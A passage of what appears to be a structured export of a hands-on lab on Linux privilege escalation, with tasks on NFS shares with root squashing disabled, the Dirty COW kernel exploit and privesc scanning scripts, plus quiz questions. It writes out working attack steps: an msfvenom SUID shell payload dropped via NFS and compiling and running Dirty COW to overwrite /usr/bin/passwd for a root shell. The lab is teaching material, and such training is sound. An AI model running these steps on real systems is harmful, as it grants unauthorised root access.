/></p><p><span style="font-weight:700">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 18, 'taskCreated': '2020-05-18T20:31:39.823Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.<br /></p>', 'hint': ''}]}, {'taskTitle': 'NFS', 'taskDesc': '<p>Files created via NFS inherit the <b>remote</b>\xa0user\'s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.</p><p>Check the NFS share configuration on the Debian VM:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0)">cat /etc/exports</code></p><p>Note that the <b>/tmp</b> share has root squashing disabled.</p><p>On your Kali box, switch to your root user if you are not already running as root:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">sudo su</code></p><p>Using Kali\'s root user, create a mount point on your Kali box and mount the <b>/tmp</b> share (update the IP accordingly)<span style="font-size:1rem">:</span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">mkdir /tmp/nfs<br />mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs</code></p><p><span style="font-size:1rem">Still using Kali\'s root user, generate a payload using <b>msfvenom</b> and save it to the mounted share (this payload simply calls /bin/bash):</span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</code></p><p>Still using Kali\'s root user, make the file executable and set the SUID permission:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">chmod +xs /tmp/nfs/shell.elf</code></p><p>Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">/tmp/shell.elf</code><br /></p><p><span style="font-weight:700">Remember to exit out of the root shell before continuing!</span><br /></p>', 'taskType': 'none', 'taskNo': 19, 'taskCreated': '2020-05-18T20:44:50.963Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What is the name of the option that disables root squashing?</p>', 'hint': ''}]}, {'taskTitle': 'Kernel Exploits', 'taskDesc': '<p>Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.</p><p>Run the <b>Linux Exploit Suggester 2</b> tool to identify potential kernel exploits on the current system:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</code></p><p>The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at\xa0<b>/home/user/tools/kernel-exploits/dirtycow/c0w.c</b>. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).</p><p>Compile the code and run it (note that it may take several minutes to complete):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w<br />./c0w</code></p><p>Once the exploit completes, run\xa0/usr/bin/passwd to gain a root shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">/usr/bin/passwd</code></p><p>Remember to restore the original <b>/usr/bin/passwd</b> file and exit the root shell before continuing!</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">mv\xa0/tmp/bak\xa0/usr/bin/passwd<br />exit</code></p>', 'taskType': 'none', 'taskNo': 20, 'taskCreated': '2020-05-19T14:47:00.256Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Read and follow along with the above.</p>', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation Scripts', 'taskDesc': '<p>Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory:\xa0<b>/home/user/tools/privesc-scripts</b></p>', 'taskType': 'none', 'taskNo': 21, 'taskCreated': '2020-05-18T20:50:39.279Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?</p>', 'hint': ''}]}]}